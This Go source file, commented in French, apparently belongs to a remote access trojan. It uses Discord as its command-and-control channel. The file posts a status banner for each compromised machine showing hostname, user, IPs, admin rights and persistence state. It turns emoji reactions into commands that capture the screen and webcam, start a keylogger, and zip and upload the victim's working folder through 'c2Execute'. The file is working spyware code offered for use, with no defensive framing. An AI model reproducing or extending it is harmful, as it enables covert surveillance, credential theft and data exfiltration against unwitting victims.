// menu.go — bandeau d'état et menu à boutons dans Discord.
//
// Discord n'accepte les vrais boutons cliquables que via une passerelle
// (interactions), or le payload est un client REST pur. La solution retenue
// est le menu par réactions : un message d'état porte six réactions, le
// payload les interroge toutes les 6 secondes et exécute l'action choisie,
// puis retire la réaction pour qu'elle soit de nouveau utilisable.
//
// Le message est édité (PATCH) à chaque changement d'état : démarrage →
// « en ligne », arrêt → « hors ligne » avec l'heure. L'identifiant du message
// est conservé dans le dossier de travail pour survivre aux redémarrages.
package main

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type menuItem struct {
	Emoji string
	Label string
}

var menuItems = []menuItem{
	{"🖥️", "capture d'écran"},
	{"📷", "webcam"},
	{"🔑", "journal clavier"},
	{"ℹ️", "état machine"},
	{"📁", "dossier courant (zip)"},
	{"⛔", "arrêt du payload"},
}

var (
	menuMu       sync.Mutex
	menuMsgID    string // message d'état de cette machine
	menuChanID   string
	menuSeenReac = map[string]bool{} // clé "emoji|user" déjà traitée
	menuPosted   time.Time
)

// menuStatePath est le fichier où l'identifiant du message est conservé.
func menuStatePath() string { return workPath("status.json") }

type menuState struct {
	Channel string `json:"channel"`
	Message string `json:"message"`
}

// loadMenuState relit l'identifiant du bandeau (silencieux si absent).
func loadMenuState() {
	b, err := os.ReadFile(menuStatePath())
	if err != nil {
		return
	}
	var st menuState
	if json.Unmarshal(b, &st) != nil {
		return
	}
	menuMu.Lock()
	menuChanID, menuMsgID = st.Channel, st.Message
	menuMu.Unlock()
}

func saveMenuState(channel, id string) {
	b, _ := json.Marshal(menuState{Channel: channel, Message: id})
	_ = os.WriteFile(menuStatePath(), b, 0600)
}

// menuEmbed construit le bandeau : état, machine, utilisateur, IP, horaires.
func menuEmbed(online bool) map[string]any {
	color := 0x2ecc71 // vert
	title := "🟢  EN LIGNE — " + hostname()
	state := "payload actif, tâches de fond en cours"
	if !online {
		color = 0xe74c3c // rouge
		title = "🔴  HORS LIGNE — " + hostname()
		state = "payload arrêté : aucune extraction, aucun envoi"
	}
	desc := fmt.Sprintf("%s\nutilisateur : `%s`\nIP locale : `%s`",
		state, os.Getenv("USERNAME"), strings.Join(localIPs(), ", "))
	if pub := publicIP(); pub != "" {
		desc += "\nIP publique : `" + pub + "`"
	}
	desc += "\nprivilèges : "
	if isElevated() {
		desc += "administrateur"
	} else {
		desc += "utilisateur standard"
	}
	desc += "\npersistance : "
	if persistStatus() != "absente" {
		desc += "installée"
	} else {
		desc += "absente"
	}

	fields := []map[string]any{
		{"name": "Démarré", "value": "<t:" + itoa64(menuPosted.Unix()) + ":f>", "inline": true},
		{"name": "Mise en ligne", "value": "<t:" + itoa64(time.Now().Unix()) + ":R>", "inline": true},
		{"name": "Menu", "value": "🖥️ capture · 📷 webcam · 🔑 keylog · ℹ️ état · 📁 zip · ⛔ stop", "inline": false},
	}
	return map[string]any{
		"title":       title,
		"description": desc,
		"color":       color,
		"fields":      fields,
		"footer":      map[string]any{"text": "menu par réactions — réagis puis attends 6 s"},
		"timestamp":   time.Now().Format(time.RFC3339),
	}
}

// postStatus crée (ou édite) le bandeau d'état. `online` dit l'état à
// afficher. Retourne l'identifiant du message.
func postStatus(online bool) string {
	if cfg.BotToken == "" {
		return ""
	}
	ch := targetChannel()
	if ch == "" {
		return ""
	}
	menuMu.Lock()
	id := menuMsgID
	menuMu.Unlock()

	body := map[string]any{
		"embeds": []any{menuEmbed(online)},
	}
	path := fmt.Sprintf("/channels/%s/messages", ch)
	method := "POST"
	if id != "" {
		path = fmt.Sprintf("/channels/%s/messages/%s", menuChanID, id)
		method = "PATCH"
	}
	raw, code, err := discordSendBody(method, path, body)
	if err != nil {
		plog("menu: " + err.Error())
		return ""
	}
	if code >= 300 {
		// Message supprimé (purge du salon) : on en recrée un.
		if method == "PATCH" {
			menuMu.Lock()
			menuMsgID = ""
			menuMu.Unlock()
			return postStatus(online)
		}
		plog(fmt.Sprintf("menu: HTTP %d %s", code, truncate(string(raw), 160)))
		return ""
	}
	var msg struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal(raw, &msg)
	if msg.ID == "" {
		return id
	}
	menuMu.Lock()
	menuMsgID, menuChanID = msg.ID, ch
	menuMu.Unlock()
	saveMenuState(ch, msg.ID)

	if method == "POST" {
		// Les réactions ne s'ajoutent qu'à la création : les rééditions
		// conservent celles déjà posées.
		for _, it := range menuItems {
			go addReaction(ch, msg.ID, it.Emoji)
			time.Sleep(400 * time.Millisecond)
		}
	}
	return msg.ID
}

// addReaction pose une réaction du bot sur son propre message.
func addReaction(channel, message, emoji string) {
	path := fmt.Sprintf("/channels/%s/messages/%s/reactions/%s/@me",
		channel, message, url.PathEscape(emoji))
	req, err := discordRequest("PUT", path, nil)
	if err != nil {
		return
	}
	resp, err := httpc.Do(req)
	if err != nil {
		return
	}
	_, _ = ioCopyDiscard(resp)
}

// pollMenu interroge les réactions et exécute l'action correspondante.
func pollMenu() {
	menuMu.Lock()
	ch, id := menuChanID, menuMsgID
	menuMu.Unlock()
	if ch == "" || id == "" {
		return
	}
	bot := botIDFromToken()
	for _, it := range menuItems {
		path := fmt.Sprintf("/channels/%s/messages/%s/reactions/%s?limit=25",
			ch, id, url.PathEscape(it.Emoji))
		raw, code, err := discordGet(path)
		if err != nil || code != 200 {
			continue
		}
		var users []struct {
			ID string `json:"id"`
		}
		if json.Unmarshal(raw, &users) != nil {
			continue
		}
		for _, u := range users {
			if u.ID == "0" || u.ID == bot {
				continue
			}
			key := it.Emoji + "|" + u.ID
			menuMu.Lock()
			seen := menuSeenReac[key]
			if !seen {
				menuSeenReac[key] = true
			}
			menuMu.Unlock()
			if seen {
				continue
			}
			plog("menu: action " + it.Label)
			go runMenuAction(it)
			go removeReaction(ch, id, it.Emoji, u.ID)
		}
	}
}

// removeReaction retire la réaction de l'utilisateur : l'action redevient
// disponible immédiatement.
func removeReaction(channel, message, emoji, user string) {
	path := fmt.Sprintf("/channels/%s/messages/%s/reactions/%s/%s",
		channel, message, url.PathEscape(emoji), user)
	req, err := discordRequest("DELETE", path, nil)
	if err != nil {
		return
	}
	resp, err := httpc.Do(req)
	if err != nil {
		return
	}
	_, _ = ioCopyDiscard(resp)
}

// runMenuAction traduit une réaction en commande existante.
func runMenuAction(it menuItem) {
	switch it.Emoji {
	case "🖥️":
		if _, n := sendShots("menu", shotsNow()); n == 0 {
			discordReply("capture impossible.")
		}
	case "📷":
		if err := webcamNow(); err != nil {
			discordReply("webcam : " + err.Error())
		}
	case "🔑":
		c2Execute("keylog")
	case "ℹ️":
		c2Execute("sysinfo")
	case "📁":
		wd, _ := os.Getwd()
		c2Execute("download " + wd)
	case "⛔":
		c2Execute("stop")
	}
}

// menuLoop maintient le bandeau : état en ligne au démarrage, puis une
// réédition toutes les 5 minutes (l'horodatage Discord reste relatif, mais le
// message remonte en tête du salon, preuve de vie du poste).
func menuLoop() {
	loadMenuState()
	menuPosted = time.Now()
	// Le salon de la machine peut demander quelques secondes.
	for i := 0; i < 20; i++ {
		if targetChannel() != "" {
			break
		}
		time.Sleep(5 * time.Second)
	}
	postStatus(true)
	postInfosStatus(true)
	last := time.Now()
	for {
		time.Sleep(6 * time.Second)
		if stopped.Load() {
			return
		}
		pollMenu()
		if time.Since(last) > 5*time.Minute {
			last = time.Now()
			postStatus(true)
		}
	}
}

// postInfosStatus écrit une ligne d'état dans le salon -infos : en ligne au
// démarrage, hors ligne à l'arrêt. C'est la réponse courte à « le PC est-il
// allumé ? », sans ouvrir le bandeau du salon de commande.
func postInfosStatus(online bool) {
	ch := infosChannel()
	if ch == "" {
		return
	}
	state := "🟢 en ligne"
	if !online {
		state = "🔴 hors ligne"
	}
	botSendText(ch, fmt.Sprintf("%s — **%s** · %s · %s", state, hostname(),
		strings.Join(localIPs(), ", "), time.Now().Format("02/01 15:04")))
}
